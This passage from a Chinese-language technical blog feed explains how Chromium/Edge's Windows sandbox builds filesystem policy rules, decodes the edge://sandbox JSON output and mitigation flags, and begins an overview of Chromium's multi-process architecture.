class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYFULLATTRIBUTESFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTSETINFO_RENAME, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTSETINFO_RENAME, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个初始化函数为 low-level policy 定制一了一套初级的策略。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>FileSystem的low-level policy部分做了两件事：</strong></p><ul><li>为<code>PolicyBase::AddRule</code>提供了该子系统5个service或者叫action的Rule制定接口。</li><li>编写了broker端5个(create, open, rename, query, queryFull)请求的处理，在broker端调用了对应的API函数。</li></ul><h1 id="edge-sandbox"><a href="#edge-sandbox" class="headerlink" title="edge://sandbox"></a>edge://sandbox</h1><p>当我们在 edge 输入 edge://sandbox 会返回如下界面</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210802183113.png" alt="image-20210728192811294"></p><p>粗略的看，里面包含一个活动进程表(不包括浏览器进程，因为它没有被沙箱化)和一些摘要信息，然后和每个进程的详细沙箱配置的原始数据转储成的 JSON 序列。关于像 <code>NtCreateFile</code>这些<code>service</code>的 policy 是如何设置的在上文已经进行过解读，下文主要分析一下这个页面是什么含义。</p><p>以以下序列为例，进行解读。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;desiredIntegrityLevel&quot;</span>: <span class="string">&quot;S-1-16-4096 Low&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;desiredMitigations&quot;</span>: <span class="string">&quot;0000000000af1267&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;disconnectCsrss&quot;</span>: <span class="string">&quot;disabled&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;jobLevel&quot;</span>: <span class="string">&quot;Limited User&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;lockdownLevel&quot;</span>: <span class="string">&quot;Limited&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;platformMitigations&quot;</span>: <span class="string">&quot;01111001000110000000000000010000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;policyRules&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;CreateNamedPipeW&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\\\.\\pipe\\LOCAL\\chrome.sync.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtCreateFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtOpenFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtQueryAttributesFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtQueryFullAttributesFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtSetInfoRename&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;processIds&quot;</span>: [</span><br><span class="line">      <span class="number">4888</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>关于<code>Mitigations</code>我们可以使用 google 提供的解码器进行解码：<a href="https://docs.google.com/a/chromium.org/viewer?a=v&amp;pid=sites&amp;srcid=Y2hyb21pdW0ub3JnfGRldnxneDo3MDg0MDMzODNjODgzMDMy">https://docs.google.com/a/chromium.org/viewer?a=v&amp;pid=sites&amp;srcid=Y2hyb21pdW0ub3JnfGRldnxneDo3MDg0MDMzODNjODgzMDMy</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Paste mitigation values from chrome:&#x2F;&#x2F;sandbox output.</span><br><span class="line">Chrome (desiredMitigations): </span><br><span class="line">0000000000af1267</span><br><span class="line"></span><br><span class="line">Platform (platformMitigations): </span><br><span class="line">01111001000110000000000000010000</span><br><span class="line"></span><br><span class="line">MITIGATION_DEP</span><br><span class="line">MITIGATION_DEP_NO_ATL_THUNK</span><br><span class="line">MITIGATION_SEHOP</span><br><span class="line">MITIGATION_HEAP_TERMINATE</span><br><span class="line">MITIGATION_BOTTOM_UP_ASLR</span><br><span class="line">MITIGATION_DLL_SEARCH_ORDER</span><br><span class="line">MITIGATION_EXTENSION_POINT_DISABLE</span><br><span class="line">MITIGATION_NONSYSTEM_FONT_DISABLE</span><br><span class="line">MITIGATION_FORCE_MS_SIGNED_BINS</span><br><span class="line">MITIGATION_IMAGE_LOAD_NO_REMOTE</span><br><span class="line">MITIGATION_IMAGE_LOAD_NO_LOW_LABEL</span><br><span class="line">MITIGATION_RESTRICT_INDIRECT_BRANCH_PREDICTION</span><br><span class="line"></span><br><span class="line">HEAP_TERMINATE_ALWAYS_ON</span><br><span class="line">BOTTOM_UP_ASLR_ALWAYS_ON</span><br><span class="line">EXTENSION_POINT_DISABLE_ALWAYS_ON</span><br><span class="line">BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</span><br><span class="line">FONT_DISABLE_ALWAYS_ON</span><br><span class="line">IMAGE_LOAD_NO_REMOTE_ALWAYS_ON</span><br><span class="line">IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON</span><br><span class="line">RESTRICT_INDIRECT_BRANCH_PREDICTION_ALWAYS_ON</span><br></pre></td></tr></table></figure><p>其中很大一部分都是在构造函数中传递的数值，这里主要分析一下<code>policyRules</code>，调用如下函数：</p><h2 id="GetPolicyRules"><a href="#GetPolicyRules" class="headerlink" title="GetPolicyRules"></a>GetPolicyRules</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">base::Value <span class="title">GetPolicyRules</span><span class="params">(<span class="keyword">const</span> PolicyGlobal* policy_rules)</span> </span>&#123;</span><br><span class="line">  DCHECK(policy_rules);</span><br><span class="line">  <span class="function">base::Value <span class="title">results</span><span class="params">(base::Value::Type::DICTIONARY)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; kMaxServiceCount; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!policy_rules-&gt;entry[i])</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    IpcTag service = <span class="keyword">static_cast</span>&lt;IpcTag&gt;(i);</span><br><span class="line">    results.SetKey(GetIpcTagAsString(service), <span class="comment">//根据 service 去获取其policy_rules</span></span><br><span class="line">                   GetPolicyOpcodes(policy_rules, service));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>GetPolicyRules</code>内部又会调用<code>GetIpcTagAsString</code>来获取 Ipc 的 tag，如：<code>NtCreateFile</code>这些，然后紧接着对这些 tag 的 policy 进行解析，调用<code>GetPolicyOpcodes</code></p><p><code>entry</code>指针数组，用以索引<code>PolicyGlobal</code>内每个<code>PolicyBuffer</code>。<code>PolicyBuffer</code> 是一个结构体，它包含要按顺序创建或评估的所有操作码。</p><blockquote><p>struct PolicyBuffer {</p><p> size_t opcode_count;</p><p> PolicyOpcode opcodes[1];</p><p>};</p></blockquote><h2 id="GetPolicyOpcodes"><a href="#GetPolicyOpcodes" class="headerlink" title="GetPolicyOpcodes"></a>GetPolicyOpcodes</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">base::Value <span class="title">GetPolicyOpcodes</span><span class="params">(<span class="keyword">const</span> PolicyGlobal* policy_rules, IpcTag service)</span> </span>&#123;</span><br><span class="line">  <span class="function">base::Value <span class="title">entry</span><span class="params">(base::Value::Type::LIST)</span></span>;</span><br><span class="line">  PolicyBuffer* policy_buffer = policy_rules-&gt;entry[<span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(service)];</span><br><span class="line">  <span class="comment">// Build up rules and emit when we hit an action.</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> cur_rule;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; policy_buffer-&gt;opcode_count; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> PolicyOpcode* opcode = &amp;policy_buffer-&gt;opcodes[i];</span><br><span class="line">    <span class="keyword">if</span> (opcode-&gt;GetID() != OP_ACTION) &#123; <span class="comment">//获取 opcodeID，也就是 OPCODE 类型</span></span><br><span class="line">      DCHECK(i + <span class="number">1</span> &lt; policy_buffer-&gt;opcode_count)</span><br><span class="line">          &lt;&lt; <span class="string">&quot;Non-actions should not terminate rules&quot;</span>;</span><br><span class="line">        <span class="comment">//如果下个 OPCODE 类型不是OP_ACTION，则返回 true</span></span><br><span class="line">      <span class="keyword">bool</span> peak = policy_buffer-&gt;opcodes[i + <span class="number">1</span>].GetID() != OP_ACTION; </span><br><span class="line">        <span class="comment">//获取opcode</span></span><br><span class="line">      cur_rule += GetPolicyOpcode(opcode, peak);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      cur_rule += <span class="string">&quot; -&gt; &quot;</span>;</span><br><span class="line">      cur_rule += GetPolicyOpcode(opcode, <span class="literal">false</span>);</span><br><span class="line">      entry.Append(cur_rule);</span><br><span class="line">      cur_rule.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GetPolicyOpcode"><a href="#GetPolicyOpcode" class="headerlink" title="GetPolicyOpcode"></a>GetPolicyOpcode</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">GetPolicyOpcode</span><span class="params">(<span class="keyword">const</span> PolicyOpcode* opcode, <span class="keyword">bool</span> continuation)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// See |policy_engine_opcodes.cc|.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> args[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">auto</span> options = opcode-&gt;GetOptions(); <span class="comment">//获取Options，如kPolNegateEval</span></span><br><span class="line">  <span class="keyword">auto</span> param = opcode-&gt;GetParameter(); <span class="comment">//返回操作码所关系的函数的参数。 </span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> condition;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options &amp; kPolNegateEval) <span class="comment">//检测 opcode 是否标志kPolNegateEval</span></span><br><span class="line">    condition += <span class="string">&quot;!(&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (opcode-&gt;GetID()) &#123;</span><br><span class="line">    <span class="keyword">case</span> OP_ALWAYS_FALSE:</span><br><span class="line">      condition += <span class="string">&quot;false&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_ALWAYS_TRUE:</span><br><span class="line">      condition += <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_NUMBER_MATCH:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">1</span>, &amp;args[<span class="number">1</span>]); <span class="comment">//返回存储的参数</span></span><br><span class="line">      <span class="keyword">if</span> (args[<span class="number">1</span>] == UINT32_TYPE) &#123; <span class="comment">//UINT32_TYPE:支持的 C++ 类型编码为数字 id</span></span><br><span class="line">        opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">        condition += base::StringPrintf(<span class="string">&quot;p[%d] == %x&quot;</span>, param, args[<span class="number">0</span>]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">void</span>* match_ptr = <span class="literal">nullptr</span>;</span><br><span class="line">        opcode-&gt;GetArgument(<span class="number">0</span>, &amp;match_ptr);</span><br><span class="line">        condition += base::StringPrintf(<span class="string">&quot;p[%d] == %p&quot;</span>, param, match_ptr);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_NUMBER_MATCH_RANGE:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">1</span>, &amp;args[<span class="number">1</span>]);</span><br><span class="line">      condition +=</span><br><span class="line">          base::StringPrintf(<span class="string">&quot;%x &lt;= p[%d] &lt;= %x&quot;</span>, args[<span class="number">0</span>], param, args[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_NUMBER_AND_MATCH:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">      condition += base::StringPrintf(<span class="string">&quot;p[%d] &amp; %x&quot;</span>, param, args[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_WSTRING_MATCH: &#123;</span><br><span class="line">      <span class="keyword">int</span> pos;</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">1</span>, &amp;args[<span class="number">1</span>]);  <span class="comment">// Length.</span></span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">2</span>, &amp;pos);      <span class="comment">// Position.</span></span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">3</span>, &amp;args[<span class="number">3</span>]);  <span class="comment">// Options.</span></span><br><span class="line">      <span class="comment">// These are not nul-terminated so we have to wrap them here.</span></span><br><span class="line">      <span class="comment">//检索字符串参数的实际地址</span></span><br><span class="line">      <span class="keyword">auto</span> match_string = <span class="built_in">std</span>::<span class="built_in">wstring</span>(opcode-&gt;GetRelativeString(<span class="number">0</span>), <span class="number">0</span>,</span><br><span class="line">                                       <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(args[<span class="number">1</span>]));</span><br><span class="line">      condition += GetStringMatchOperation(pos, args[<span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">if</span> (args[<span class="number">3</span>] &amp; CASE_INSENSITIVE)  <span class="comment">// if Options = 1</span></span><br><span class="line">        condition += <span class="string">&quot;_i&quot;</span>;</span><br><span class="line">      condition +=</span><br><span class="line">          base::StringPrintf(<span class="string">&quot;(p[%d], &#x27;%S&#x27;)&quot;</span>, param, match_string.c_str());</span><br><span class="line">    &#125; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_ACTION:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">      condition += GetOpcodeAction(<span class="keyword">static_cast</span>&lt;EvalResult&gt;(args[<span class="number">0</span>]));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      DCHECK(<span class="literal">false</span>) &lt;&lt; <span class="string">&quot;Unknown Opcode&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options &amp; kPolNegateEval)</span><br><span class="line">    condition += <span class="string">&quot;)&quot;</span>;</span><br><span class="line">  <span class="comment">// If there is another rule add a joining token.</span></span><br><span class="line">  <span class="keyword">if</span> (continuation) &#123;</span><br><span class="line">    <span class="keyword">if</span> (options &amp; kPolUseOREval)</span><br><span class="line">      condition += <span class="string">&quot; || &quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      condition += <span class="string">&quot; &amp;&amp; &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> condition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GetStringMatchOperation"><a href="#GetStringMatchOperation" class="headerlink" title="GetStringMatchOperation"></a>GetStringMatchOperation</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">GetStringMatchOperation</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">uint32_t</span> options)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (options &amp; EXACT_LENGTH)</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;exact&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;prefix&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;scan&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos == kSeekToEnd) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ends&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK(<span class="literal">false</span>) &lt;&lt; <span class="string">&quot;Invalid pos (&quot;</span> &lt;&lt; pos &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="StringMatchOptions"><a href="#StringMatchOptions" class="headerlink" title="StringMatchOptions"></a>StringMatchOptions</h2><ul><li><strong>CASE_SENSITIVE = 0：</strong>Pay or Not attention to the case as defined by</li><li><strong>CASE_INSENSITIVE = 1：</strong>RtlCompareUnicodeString windows API.</li><li><strong>EXACT_LENGTH = 2：</strong>Don’t do substring match. Do full string match.</li></ul><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;NtCreateFile&quot;: [</span><br><span class="line">        &quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#39;\\??\\&#39;)) -&gt; askBroker&quot;,</span><br><span class="line">        &quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#39;~&#39;) -&gt; askBroker&quot;,</span><br><span class="line">        &quot;prefix_i(p[0], &#39;\\??\\pipe\\chrome.&#39;) -&gt; askBroker&quot;,</span><br><span class="line">        &quot;prefix_i(p[0], &#39;\\??\\pipe\\LOCAL\\chrome.&#39;) -&gt; askBroker&quot;</span><br><span class="line">      ],</span><br></pre></td></tr></table></figure><p>上述其实描述的是一个 opcode 组内的 opcode 的值是什么。</p><p><code>!(</code>：opcode 的 option 为 <code>kPolNegateEval</code></p><p><code>p[1] &amp; 1</code>:  <code>&amp;</code> 代表opcode 的类型为<code>OP_NUMBER_AND_MATCH</code>，原函数<code>args[1]=1</code></p><p><code>&amp;&amp;</code>：options 不为<code>kPolUseOREval</code></p><p><code>prefix</code>：String Match Options 不为<code>EXACT_LENGTH</code></p><p>…</p><p>总结：这些数据整体上描述了一个 opcode 组的内容，这个 opcode 组构成了该函数的高级缓解策略。</p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> policy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chromium 基础架构</title>
      <link href="posts/d4e8f763/"/>
      <url>posts/d4e8f763/</url>
      
        <content type="html"><![CDATA[<h1 id="多进程架构"><a href="#多进程架构" class="headerlink" title="多进程架构"></a>多进程架构</h1><ul><li><p>Chromium 的每个标签页都是一个独立的进程，为了确保安全，Chromium 会限制每个渲染引擎彼此之间的访问权限，以及他们访问系统其他资源的权限。</p></li><li><p>运行 UI 和管理 Tab/Plugin 的主进程称为”浏览器进程” 或 “浏览器（Browser）”，标签页相关的进程被称作”渲染线程”或”渲染器（renderer）”</p></li><li><p>renderer 使用 Blink 开源引擎来实现解析和 HTML 布局</p>  <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210723133050.png" style="zoom:67%;" /></li></ul><h2 id="Managing-render-processes"><a href="#Managing-render-processes" class="headerlink" title="Managing render processes"></a>Managing render processes</h2><p>每个渲染进程有一个全局的 RenderProcess 对象，该对象管理渲染进程与父浏览器进程之间的通信，并维护全局状态。浏览器为每个渲染进程维护一个对应的RenderViewHost，用来管理浏览器状态，并与渲染器通信。浏览器与渲染器使用<a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/General_Architecture/Inter-process_Communication.html">Chromium’s IPC system</a>进行通信。</p><h2 id="Managing-views"><a href="#Managing-views" class="headerlink" title="Managing views"></a>Managing views</h2><p>每个渲染进程都有一个或多个 RenderView 对象，由 <code>RenderProcess</code> 管理(它与标签页的内容相关)。相应的<code>RenderProcessHost</code>维护一个与渲染器中每个view相关的<code>RenderViewHost</code>。每个view被赋予一个view ID，以区分同一个渲染器中的不同view。这些 ID 在一个渲染器中是唯一的，但在浏览器中不是唯一的，所以区分一个view需要一个RenderProcessHost和一个view ID。</p><p>浏览器与特定标签页之间的通信是通过RenderViewHost对象来完成的。</p><h2 